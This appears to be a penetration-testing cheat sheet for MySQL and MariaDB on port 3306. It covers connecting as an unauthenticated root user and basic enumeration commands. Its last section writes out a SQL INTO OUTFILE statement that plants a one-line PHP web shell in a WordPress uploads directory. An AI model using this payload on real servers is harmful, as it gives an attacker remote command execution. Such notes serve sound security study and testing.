---
title: "3306 mariadb mysql"
author: amandaguglieri
draft: false
TableOfContents: true
---

# 3306 mariaDB - mySQL

## Description

**MySQL**: MySQL is an open-source relational database management system(RDBMS) based on Structured Query Language (SQL). It is developed and managed by oracle corporation and initially released on 23 may, 1995. It is widely being used in many small and large scale industrial applications and capable of handling a large volume of data. After the acquisition of MySQL by Oracle, some issues happened with the usage of the database and hence MariaDB was developed.

**MariaDB**: MariaDB is an open source relational database management system (RDBMS) that is a compatible drop-in replacement for the widely used MySQL database technology. It is developed by MariaDB Foundation and initially released on 29 October 2009. MariaDB has a significantly high number of new features, which makes it better in terms of performance and user-orientation than MySQL.



## Connect to database: mariadb

```bash
# -h host/ip   
# -u user As default mariadb has a root user with no authentication
mariadb -h <host/IP> -u root
```


## Connect to database: mysql 

```bash
# -h host/ip   
# -u user As default mysql has a root user with no authentication
mysql --host=INSTANCE_IP --user=root --password=thepassword
mysql -h <host/IP> -u root -p fArFLP29UySm4bZj
```

## mariadb commands

```bash
# Get all databases
show databases;

# Select a database
use <databaseName>;

# Get all tables from the previously selected database
show tables; 

# Dump columns from a table
describe <table_name>;

# Dump columns from a table
show columns from <table>;
```

## Upload a shell 

Take a wordpress installation that uses a mysql database. If you manage to login into the mysql panel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.

```mysql
Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```
